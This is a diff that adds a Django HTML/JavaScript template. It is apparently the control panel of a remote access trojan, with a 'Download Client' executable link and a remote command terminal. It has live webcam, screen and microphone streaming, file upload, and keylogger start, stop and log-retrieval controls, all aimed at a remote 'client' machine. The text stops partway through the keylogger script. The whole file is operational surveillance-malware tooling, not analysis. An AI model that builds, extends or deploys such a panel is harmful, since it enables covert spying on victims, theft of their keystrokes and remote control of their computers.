@@ -1,0 +1,1208 @@
+<!DOCTYPE html>
+<html lang="fa" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پنل مدیریت پیشرفته | {{ client.display_name|default:client.client_id }}</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #5b4ce8;
+            --secondary-color: #9c88ff;
+            --accent-color: #00d4c7;
+            --dark-color: #0f0f1f;
+            --light-color: #f8f9fa;
+            --success-color: #00ff9d;
+            --danger-color: #ff3b6e;
+            --warning-color: #ffdd59;
+            --info-color: #00b4ff;
+            --header-height: 80px;
+            --neon-glow: 0 0 8px, 0 0 16px, 0 0 24px;
+        }
+
+        * {
+            box-sizing: border-box;
+            transition: all 0.3s ease-in-out;
+        }
+
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background: linear-gradient(135deg, #0f0f1f 0%, #1e1e3a 60%, #2e2e5a 100%);
+            color: var(--light-color);
+            margin: 0;
+            overflow-x: hidden;
+            line-height: 1.7;
+            direction: ltr;
+        }
+
+        .glass-effect {
+            background: rgba(20, 20, 40, 0.8);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            border-radius: 16px;
+        }
+
+        .neon-border {
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 8px var(--primary-color), 
+                        inset 0 0 8px rgba(91, 76, 232, 0.3);
+        }
+
+        .neon-text-primary {
+            color: var(--primary-color);
+            text-shadow: 0 0 5px var(--primary-color), 
+                         0 0 10px var(--primary-color);
+        }
+
+        .neon-text-accent {
+            color: var(--accent-color);
+            text-shadow: 0 0 5px var(--accent-color), 
+                         0 0 10px var(--accent-color);
+        }
+
+        .main-content {
+            padding: 40px 20px;
+            min-height: 100vh;
+        }
+
+        .header {
+            height: var(--header-height);
+            background: rgba(20, 20, 40, 0.85);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-bottom: 1px solid rgba(91, 76, 232, 0.4);
+            position: fixed;
+            top: 0;
+            right: 0;
+            left: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 40px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .header-nav a {
+            color: var(--light-color);
+            text-decoration: none;
+            padding: 10px 20px;
+            margin: 0 10px;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            position: relative;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+
+        .header-nav a:hover {
+            background: rgba(91, 76, 232, 0.25);
+            color: #fff;
+            box-shadow: 0 0 10px rgba(91, 76, 232, 0.5);
+            transform: scale(1.05);
+        }
+
+        .header-nav a i {
+            margin-right: 8px;
+        }
+
+        .tabs-container {
+            margin-top: calc(var(--header-height) + 40px);
+        }
+
+        .tabs-header {
+            display: flex;
+            overflow-x: auto;
+            padding-bottom: 12px;
+            margin-bottom: 40px;
+            border-bottom: 1px solid rgba(91, 76, 232, 0.3);
+        }
+
+        .tab-btn {
+            background: none;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1rem;
+            cursor: pointer;
+            color: rgba(255, 255, 255, 0.8);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-radius: 12px 12px 0 0;
+            position: relative;
+            white-space: nowrap;
+        }
+
+        .tab-btn:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            width: 0;
+            height: 3px;
+            background: var(--primary-color);
+            box-shadow: 0 0 10px var(--primary-color);
+            transition: all 0.3s ease;
+        }
+
+        .tab-btn.active {
+            color: #fff;
+            background: rgba(91, 76, 232, 0.25);
+        }
+
+        .tab-btn.active:after {
+            width: 100%;
+            left: 0;
+        }
+
+        .tab-btn:hover {
+            color: #fff;
+            background: rgba(91, 76, 232, 0.2);
+            transform: scale(1.05);
+        }
+
+        .tab-btn i {
+            font-size: 1.3rem;
+        }
+
+        .tab-pane {
+            display: none;
+            animation: fadeIn 0.6s ease;
+        }
+
+        .tab-pane.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .terminal-container {
+            background: rgba(20, 20, 40, 0.8);
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
+            direction: ltr;
+        }
+
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            font-size: 1rem;
+            color: var(--secondary-color);
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(91, 76, 232, 0.3);
+            text-align: left;
+        }
+
+        .terminal-history {
+            min-height: 300px;
+            max-height: 500px;
+            overflow-y: auto;
+            background: rgba(10, 10, 30, 0.5);
+            padding: 20px;
+            border-radius: 12px;
+            font-family: monospace;
+            font-size: 1rem;
+            margin-bottom: 20px;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+            color: #fff;
+            text-align: left;
+        }
+
+        .terminal-history .command {
+            color: var(--success-color);
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .terminal-history .output {
+            color: #fff;
+            margin-bottom: 12px;
+            padding-left: 25px;
+            border-left: 3px solid var(--primary-color);
+        }
+
+        .command-line {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(10, 10, 30, 0.5);
+            padding: 12px 20px;
+            border-radius: 12px;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+            direction: ltr;
+        }
+
+        .command-prompt {
+            color: var(--success-color);
+            font-weight: bold;
+            text-shadow: 0 0 6px var(--success-color);
+            font-size: 1.1rem;
+        }
+
+        .command-input {
+            flex: 1;
+            background: transparent;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 1rem;
+            outline: none;
+            direction: ltr;
+        }
+
+        .terminal-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .btn-terminal {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 12px;
+            font-size: 0.95rem;
+        }
+
+        .btn-terminal:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: all 0.5s ease;
+        }
+
+        .btn-terminal:hover:before {
+            left: 100%;
+        }
+
+        .btn-terminal:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 12px rgba(91, 76, 232, 0.5);
+        }
+
+        .btn-terminal-primary {
+            background: rgba(91, 76, 232, 0.3);
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+        }
+
+        .btn-terminal-secondary {
+            background: rgba(0, 212, 199, 0.3);
+            color: var(--accent-color);
+            border: 1px solid var(--accent-color);
+        }
+
+        .btn-terminal-success {
+            background: rgba(0, 255, 157, 0.3);
+            color: var(--success-color);
+            border: 1px solid var(--success-color);
+        }
+
+        .btn-terminal-danger {
+            background: rgba(255, 59, 110, 0.3);
+            color: var(--danger-color);
+            border: 1px solid var(--danger-color);
+        }
+
+        .btn-terminal-warning {
+            background: rgba(255, 221, 89, 0.3);
+            color: var(--warning-color);
+            border: 1px solid var(--warning-color);
+        }
+
+        .stream-container {
+            text-align: center;
+            padding: 30px;
+            background: rgba(20, 20, 40, 0.8);
+            border-radius: 16px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .stream-placeholder {
+            min-height: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            color: rgba(255, 255, 255, 0.6);
+            background: rgba(10, 10, 30, 0.5);
+            border-radius: 12px;
+            padding: 40px;
+            border: 2px dashed rgba(91, 76, 232, 0.3);
+        }
+
+        .stream-placeholder i {
+            font-size: 3.5rem;
+            opacity: 0.6;
+        }
+
+        .stream-controls {
+            margin-top: 25px;
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+        }
+
+        .stream-btn {
+            padding: 14px;
+            border: none;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 12px rgba(0, 0, 0, 0.3);
+        }
+
+        .stream-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 18px currentColor;
+        }
+
+        .stream-btn-play {
+            background: var(--success-color);
+            color: #fff;
+            box-shadow: 0 0 12px var(--success-color);
+        }
+
+        .stream-btn-capture {
+            background: var(--warning-color);
+            color: #fff;
+            box-shadow: 0 0 12px var(--warning-color);
+        }
+
+        .stream-btn-stop {
+            background: var(--danger-color);
+            color: #fff;
+            box-shadow: 0 0 12px var(--danger-color);
+        }
+
+        .files-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 25px;
+            background: rgba(20, 20, 40, 0.8);
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .files-table th, .files-table td {
+            padding: 20px;
+            text-align: left;
+            border-bottom: 1px solid rgba(91, 76, 232, 0.3);
+        }
+
+        .files-table th {
+            background: rgba(91, 76, 232, 0.3);
+            color: var(--primary-color);
+            font-weight: 500;
+        }
+
+        .files-table tr:hover {
+            background: rgba(91, 76, 232, 0.2);
+        }
+
+        .recent-activities {
+            margin-top: 40px;
+            padding: 30px;
+            background: rgba(20, 20, 40, 0.8);
+            border-radius: 16px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(91, 76, 232, 0.3);
+            text-align: left;
+        }
+
+        .activity-item {
+            padding: 15px 20px;
+            margin-bottom: 10px;
+            border-radius: 12px;
+            background: rgba(91, 76, 232, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            animation: slideIn 0.5s ease;
+        }
+
+        .activity-item i {
+            margin-right: 10px;
+            color: var(--accent-color);
+        }
+
+        .activity-item:last-child {
+            margin-bottom: 0;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .client-info {
+            background: rgba(20, 20, 40, 0.8);
+            padding: 25px;
+            border-radius: 16px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
+            text-align: left;
+        }
+
+        .stream-error {
+            color: var(--danger-color);
+            font-size: 0.95rem;
+            text-align: center;
+            margin-top: 20px;
+            text-shadow: 0 0 5px var(--danger-color);
+        }
+
+        .keylogger-container .btn-terminal {
+            padding: 12px 30px;
+            border-radius: 50px;
+            min-width: 140px;
+            justify-content: center;
+            font-size: 0.9rem;
+        }
+
+        .keylogger-buttons {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(20, 20, 40, 0.5);
+            border-radius: 12px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary-color);
+            border-radius: 12px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--secondary-color);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .header {
+                padding: 0 20px;
+            }
+
+            .header-nav {
+                flex-wrap: wrap;
+                gap: 15px;
+            }
+
+            .tabs-header {
+                flex-wrap: nowrap;
+                overflow-x: auto;
+            }
+            
+            .tab-btn {
+                padding: 10px 20px;
+                font-size: 0.9rem;
+            }
+            
+            .terminal-actions {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .terminal-actions > div {
+                width: 100%;
+                display: flex;
+                justify-content: space-between;
+            }
+
+            .keylogger-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header glass-effect">
+        <h3 class="neon-text-primary mb-0">Client Management Panel</h3>
+        <div class="header-actions d-flex align-items-center gap-3">
+            <div class="header-nav d-flex align-items-center">
+                <a href="{% url 'cmd_page' client_id=client.client_id %}"><i class="fas fa-desktop"></i> Dashboard</a>
+                <a href="{% url 'client_activities' client_id=client.client_id %}"><i class="fas fa-history"></i> Activities</a>
+                <a href="{% url 'generate_exe' %}"><i class="fas fa-download"></i> Download Client</a>
+            </div>
+            <button id="themeToggle" class="btn-terminal btn-terminal-secondary">
+                <i class="fas fa-moon"></i>
+            </button>
+            <a href="{% url 'index' %}" class="btn-terminal btn-terminal-primary">
+                <i class="fas fa-home"></i> Back
+            </a>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <h2 class="neon-text-accent mb-4">Client Management: {{ client.display_name|default:client.client_id }}</h2>
+        
+        <div class="client-info">
+            <div class="mb-2"><i class="fas fa-clock me-2"></i> Last Activity: {{ client.last_seen|date:"Y/m/d H:i" }}</div>
+            <div class="mb-3"><i class="fas fa-info-circle me-2"></i> System Info: {{ client.system_info|default:"Not Available" }}</div>
+            <form action="{% url 'update_client_name' client_id=client.client_id %}" method="POST" class="d-flex align-items-center mt-3">
+                {% csrf_token %}
+                <input type="text" name="new_name" placeholder="New Client Name" class="form-control glass-effect command-input me-2" style="width: 200px;">
+                <button type="submit" class="btn-terminal btn-terminal-primary">Change Name</button>
+            </form>
+        </div>
+
+        <div class="tabs-container">
+            <div class="tabs-header">
+                <button class="tab-btn active" data-tab="terminal">
+                    <i class="fas fa-terminal"></i>
+                    Terminal
+                </button>
+                <button class="tab-btn" data-tab="webcam">
+                    <i class="fas fa-video"></i>
+                    Webcam
+                </button>
+                <button class="tab-btn" data-tab="screen">
+                    <i class="fas fa-desktop"></i>
+                    Screen
+                </button>
+                <button class="tab-btn" data-tab="audio">
+                    <i class="fas fa-microphone"></i>
+                    Audio
+                </button>
+                <button class="tab-btn" data-tab="files">
+                    <i class="fas fa-folder"></i>
+                    File Management
+                </button>
+                <button class="tab-btn" data-tab="keylogger">
+                    <i class="fas fa-keyboard"></i>
+                    Keylogger
+                </button>
+            </div>
+
+            <div class="tabs-content">
+                <!-- Terminal Tab -->
+                <div class="tab-pane active" id="terminal-tab">
+                    <div class="terminal-container glass-effect">
+                        <div class="terminal-header">
+                            <div>Client Management System - Version 2.0</div>
+                            <div>Last Activity: {{ client.last_seen|date:"Y/m/d H:i" }}</div>
+                        </div>
+                        
+                        <div class="terminal-history" id="command-history">
+                            {% if client.last_output %}
+                                <div class="output">{{ client.last_output }}</div>
+                            {% else %}
+                                <div class="output">...</div>
+                            {% endif %}
+                        </div>
+                        
+                        <div class="command-line glass-effect">
+                            <span class="command-prompt">$</span>
+                            <input type="text" class="command-input" id="commandInput" autofocus placeholder="Enter your command...">
+                        </div>
+                    </div>
+                    
+                    <div class="terminal-actions">
+                        <button class="btn-terminal btn-terminal-primary" onclick="sendCommand()">
+                            <i class="fas fa-paper-plane"></i>
+                            Execute Command
+                        </button>
+                        <div>
+                            <button class="btn-terminal btn-terminal-secondary me-2" onclick="quickCommand('help')">
+                                <i class="fas fa-question-circle"></i>
+                                Help
+                            </button>
+                            <button class="btn-terminal btn-terminal-danger" onclick="clearTerminal()">
+                                <i class="fas fa-broom"></i>
+                                Clear
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Webcam Tab -->
+                <div class="tab-pane" id="webcam-tab">
+                    <div class="stream-container glass-effect">
+                        <div class="stream-placeholder" id="webcam-placeholder">
+                            <i class="fas fa-video-slash"></i>
+                            <span>Camera Disabled</span>
+                        </div>
+                        <div class="stream-controls">
+                            <button class="stream-btn stream-btn-play" onclick="startStream('webcam')">
+                                <i class="fas fa-play"></i>
+                            </button>
+                            <button class="stream-btn stream-btn-capture" onclick="captureImage()">
+                                <i class="fas fa-camera"></i>
+                            </button>
+                            <button class="stream-btn stream-btn-stop" onclick="stopStream()">
+                                <i class="fas fa-stop"></i>
+                            </button>
+                        </div>
+                        <div class="stream-error" id="webcam-error"></div>
+                    </div>
+                </div>
+                
+                <!-- Screen Tab -->
+                <div class="tab-pane" id="screen-tab">
+                    <div class="stream-container glass-effect">
+                        <div class="stream-placeholder" id="screen-placeholder">
+                            <i class="fas fa-desktop"></i>
+                            <span>Screen Disabled</span>
+                        </div>
+                        <div class="stream-controls">
+                            <button class="stream-btn stream-btn-play" onclick="startStream('weblive')">
+                                <i class="fas fa-play"></i>
+                            </button>
+                            <button class="stream-btn stream-btn-capture" onclick="quickCommand('screenshot')">
+                                <i class="fas fa-camera"></i>
+                            </button>
+                            <button class="stream-btn stream-btn-stop" onclick="stopStream()">
+                                <i class="fas fa-stop"></i>
+                            </button>
+                        </div>
+                        <div class="stream-error" id="screen-error"></div>
+                    </div>
+                </div>
+                
+                <!-- Audio Tab -->
+                <div class="tab-pane" id="audio-tab">
+                    <div class="stream-container glass-effect">
+                        <div class="stream-placeholder" id="audio-placeholder">
+                            <i class="fas fa-microphone-slash"></i>
+                            <span>Microphone Disabled</span>
+                        </div>
+                        <div class="stream-controls">
+                            <button class="stream-btn stream-btn-play" onclick="startStream('webmicrophone')">
+                                <i class="fas fa-play"></i>
+                            </button>
+                            <button class="stream-btn stream-btn-stop" onclick="stopStream()">
+                                <i class="fas fa-stop"></i>
+                            </button>
+                        </div>
+                        <div class="stream-error" id="audio-error"></div>
+                    </div>
+                </div>
+                
+                <!-- File Management Tab -->
+                <div class="tab-pane" id="files-tab">
+                    <div class="files-container glass-effect p-4 rounded">
+                        <div class="mb-4 d-flex align-items-center flex-wrap">
+                            <input type="file" id="fileInput" class="form-control glass-effect d-inline-block w-auto me-2 mb-2">
+                            <button class="btn-terminal btn-terminal-primary me-2 mb-2" onclick="uploadFile()">
+                                <i class="fas fa-upload"></i>
+                                Upload
+                            </button>
+                            <button class="btn-terminal btn-terminal-secondary mb-2" onclick="refreshFiles()">
+                                <i class="fas fa-sync"></i>
+                                Refresh
+                            </button>
+                        </div>
+                        <table class="table files-table">
+                            <thead>
+                                <tr>
+                                    <th>File Name</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="fileList">
+                                <!-- Files will be populated dynamically -->
+                                <tr>
+                                    <td colspan="2" class="text-center py-4">No files found</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                
+                <!-- Keylogger Tab -->
+                <div class="tab-pane" id="keylogger-tab">
+                    <div class="keylogger-container glass-effect p-4 rounded">
+                        <div class="keylogger-buttons mb-4">
+                            <button class="btn-terminal btn-terminal-success" onclick="startKeylogger()">
+                                <i class="fas fa-play"></i>
+                                Start Keylogger
+                            </button>
+                            <button class="btn-terminal btn-terminal-danger" onclick="stopKeylogger()">
+                                <i class="fas fa-stop"></i>
+                                Stop Keylogger
+                            </button>
+                            <button class="btn-terminal btn-terminal-secondary" onclick="getKeyloggerLogs()">
+                                <i class="fas fa-sync"></i>
+                                Get Logs
+                            </button>
+                            <button class="btn-terminal btn-terminal-warning" onclick="clearKeyloggerLogs()">
+                                <i class="fas fa-trash"></i>
+                                Clear Logs
+                            </button>
+                        </div>
+                        <div class="terminal-container glass-effect">
+                            <div class="terminal-header">
+                                <div>Keylogger Active: <span id="keylogger-status">No</span></div>
+                                <div>Recorded Characters: <span id="keylogger-count">0</span></div>
+                            </div>
+                            <div class="terminal-history" id="keylogger-output" style="height: 350px; font-family: monospace;">
+                                Keylogger logs will be displayed here...
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="recent-activities glass-effect">
+            <h4 class="neon-text-accent mb-4">Recent Activities</h4>
+            {% for activity in activities %}
+                <div class="activity-item">
+                    <div>
+                        <i class="fas {% if activity.activity_type == 'command' %}fa-terminal{% elif activity.activity_type == 'file_upload' %}fa-upload{% else %}fa-info-circle{% endif %}"></i>
+                        <strong>{{ activity.activity_type }}:</strong> {{ activity.description }}
+                    </div>
+                    <small class="text-muted">{{ activity.created_at|date:"Y/m/d H:i" }}</small>
+                </div>
+            {% empty %}
+                <div class="activity-item text-center">
+                    <i class="fas fa-info-circle"></i> No activities recorded
+                </div>
+            {% endfor %}
+        </div>
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Theme Toggle
+        document.getElementById('themeToggle').addEventListener('click', function() {
+            document.body.classList.toggle('dark-mode');
+            localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light');
+            
+            const icon = this.querySelector('i');
+            if (document.body.classList.contains('dark-mode')) {
+                icon.classList.remove('fa-moon');
+                icon.classList.add('fa-sun');
+            } else {
+                icon.classList.remove('fa-sun');
+                icon.classList.add('fa-moon');
+            }
+        });
+        
+        if (localStorage.getItem('theme') === 'dark') {
+            document.body.classList.add('dark-mode');
+            const icon = document.querySelector('#themeToggle i');
+            icon.classList.remove('fa-moon');
+            icon.classList.add('fa-sun');
+        }
+        
+        // Tab Switching
+        let currentStreamInterval = null;
+        let keyloggerInterval = null;
+
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+                
+                this.classList.add('active');
+                const tabId = this.getAttribute('data-tab');
+                document.getElementById(`${tabId}-tab`).classList.add('active');
+
+                // Stop previous streams when switching tabs
+                if (currentStreamInterval) {
+                    clearInterval(currentStreamInterval);
+                    currentStreamInterval = null;
+                    stopStream();
+                }
+
+                // Stop keylogger updates when switching tabs
+                if (keyloggerInterval) {
+                    clearInterval(keyloggerInterval);
+                    keyloggerInterval = null;
+                }
+
+                // Clear error messages
+                document.getElementById('webcam-error').innerText = '';
+                document.getElementById('screen-error').innerText = '';
+                document.getElementById('audio-error').innerText = '';
+            });
+        });
+
+        let lastCommandId = null;
+        let lastOutput = null;
+
+        // Send Command
+        function sendCommand() {
+            const command = document.getElementById('commandInput').value.trim();
+            if (!command || command === '0' || command === '00') return; // Filter invalid commands
+
+            const historyDiv = document.getElementById('command-history');
+            historyDiv.innerHTML += `<div class="command">$ ${command}</div>`;
+
+            fetch(`/api/command/{{ client.client_id }}/`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRFToken': '{{ csrf_token }}'
+                },
+                body: JSON.stringify({ command: command })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Command response:', data);
+                lastCommandId = data.command_id;
+                let output = data.output || 'Waiting for response...';
+                if (typeof output !== 'string') {
+                    output = 'Non-textual data received';
+                }
+                historyDiv.innerHTML += `<div class="output">${output}</div>`;
+                document.getElementById('commandInput').value = '';
+                historyDiv.scrollTop = historyDiv.scrollHeight;
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                historyDiv.innerHTML += `<div class="output text-danger">Error: ${error.message}</div>`;
+            });
+        }
+
+        // Poll for new output
+        function pollOutput() {
+            fetch(`/api/poll/{{ client.client_id }}/`)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Poll response:', data);
+                    const output = data.output || 'No output available';
+                    if (output !== lastOutput && output !== 'No output available') {
+                        const historyDiv = document.getElementById('command-history');
+                        historyDiv.innerHTML += `<div class="output">${output}</div>`;
+                        lastOutput = output;
+                        historyDiv.scrollTop = historyDiv.scrollHeight;
+                    }
+                })
+                .catch(error => {
+                    console.error('Poll error:', error);
+                });
+        }
+
+        // Start Polling
+        setInterval(pollOutput, 2000); // Check every 2 seconds
+
+        // Quick Commands
+        function quickCommand(command) {
+            document.getElementById('commandInput').value = command;
+            sendCommand();
+        }
+
+        // Clear Terminal
+        function clearTerminal() {
+            document.getElementById('command-history').innerHTML = '';
+            lastOutput = null;
+        }
+
+        // Stream Management
+        function startStream(type) {
+            // Stop previous stream
+            if (currentStreamInterval) {
+                clearInterval(currentStreamInterval);
+                currentStreamInterval = null;
+            }
+
+            quickCommand(type);
+            if (type === 'webcam') {
+                updateWebcamStream();
+            } else if (type === 'weblive') {
+                updateScreenStream();
+            } else if (type === 'webmicrophone') {
+                updateAudioStream();
+            }
+        }
+
+        function stopStream() {
+            if (currentStreamInterval) {
+                clearInterval(currentStreamInterval);
+                currentStreamInterval = null;
+            }
+            quickCommand('stop_stream');
+
+            // Reset placeholders
+            const webcamPlaceholder = document.getElementById('webcam-placeholder');
+            const screenPlaceholder = document.getElementById('screen-placeholder');
+            const audioPlaceholder = document.getElementById('audio-placeholder');
+            webcamPlaceholder.innerHTML = '<i class="fas fa-video-slash"></i><span>Camera Disabled</span>';
+            screenPlaceholder.innerHTML = '<i class="fas fa-desktop"></i><span>Screen Disabled</span>';
+            audioPlaceholder.innerHTML = '<i class="fas fa-microphone-slash"></i><span>Microphone Disabled</span>';
+            document.getElementById('webcam-error').innerText = '';
+            document.getElementById('screen-error').innerText = '';
+            document.getElementById('audio-error').innerText = '';
+        }
+
+        // Update Webcam Stream
+        function updateWebcamStream() {
+            const stream = document.getElementById('webcam-placeholder');
+            stream.innerHTML = '<div class="spinner-border text-light"></div>';
+            document.getElementById('webcam-error').innerText = '';
+
+            currentStreamInterval = setInterval(() => {
+                fetch(`/api/stream/{{ client.client_id }}/webcam/`)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! status: ${response.status}`);
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        if (data.data && !data.data.startsWith('Error')) {
+                            stream.innerHTML = `<img src="data:image/jpeg;base64,${data.data}" class="w-100 rounded">`;
+                        } else {
+                            stream.innerHTML = '<i class="fas fa-video-slash"></i><span>Camera Disabled</span>';
+                            document.getElementById('webcam-error').innerText = data.data || 'Error receiving webcam image';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Webcam stream error:', error);
+                        stream.innerHTML = '<i class="fas fa-video-slash"></i><span>Camera Disabled</span>';
+                        document.getElementById('webcam-error').innerText = `Error: ${error.message}`;
+                    });
+            }, 1000);
+        }
+
+        // Update Screen Stream
+        function updateScreenStream() {
+            const stream = document.getElementById('screen-placeholder');
+            stream.innerHTML = '<div class="spinner-border text-light"></div>';
+            document.getElementById('screen-error').innerText = '';
+
+            currentStreamInterval = setInterval(() => {
+                fetch(`/api/stream/{{ client.client_id }}/weblive/`)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! status: ${response.status}`);
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        if (data.data && !data.data.startsWith('Error')) {
+                            stream.innerHTML = `<img src="data:image/jpeg;base64,${data.data}" class="w-100 rounded">`;
+                        } else {
+                            stream.innerHTML = '<i class="fas fa-desktop"></i><span>Screen Disabled</span>';
+                            document.getElementById('screen-error').innerText = data.data || 'Error receiving screen image';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Screen stream error:', error);
+                        stream.innerHTML = '<i class="fas fa-desktop"></i><span>Screen Disabled</span>';
+                        document.getElementById('screen-error').innerText = `Error: ${error.message}`;
+                    });
+            }, 1000);
+        }
+
+        // Update Audio Stream
+        function updateAudioStream() {
+            const stream = document.getElementById('audio-placeholder');
+            stream.innerHTML = '<div class="spinner-border text-light"></div>';
+            document.getElementById('audio-error').innerText = '';
+
+            currentStreamInterval = setInterval(() => {
+                fetch(`/api/stream/{{ client.client_id }}/webmicrophone/`)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! status: ${response.status}`);
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        if (data.data && !data.data.startsWith('Error')) {
+                            stream.innerHTML = `
+                                <audio controls autoplay class="w-100">
+                                    <source src="data:audio/wav;base64,${data.data}" type="audio/wav">
+                                    Your browser does not support audio playback.
+                                </audio>`;
+                        } else {
+                            stream.innerHTML = '<i class="fas fa-microphone-slash"></i><span>Microphone Disabled</span>';
+                            document.getElementById('audio-error').innerText = data.data || 'Error receiving audio';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Audio stream error:', error);
+                        stream.innerHTML = '<i class="fas fa-microphone-slash"></i><span>Microphone Disabled</span>';
+                        document.getElementById('audio-error').innerText = `Error: ${error.message}`;
+                    });
+            }, 2000);
+        }
+
+        // Capture Image
+        function captureImage() {
+            quickCommand('screenshot');
+        }
+
+        // Keylogger Management
+        function startKeylogger() {
+            fetch(`/api/keylogger/{{ client.client_id }}/`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRFToken': '{{ csrf_token }}'
+                },
+                body: JSON.stringify({ action: 'start' })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Keylogger started successfully');
+                document.getElementById('keylogger-status').textContent = 'Yes';
